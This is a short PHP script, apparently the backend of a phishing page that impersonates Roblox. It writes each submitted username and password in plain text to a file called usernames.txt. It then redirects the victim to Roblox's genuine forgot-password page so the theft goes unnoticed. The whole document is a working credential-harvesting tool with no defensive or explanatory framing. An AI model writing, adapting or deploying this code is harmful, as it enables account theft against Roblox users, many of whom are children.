<?php

file_put_contents("usernames.txt", "Roblox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.roblox.com/login/forgot-password-or-username/');
exit();
?>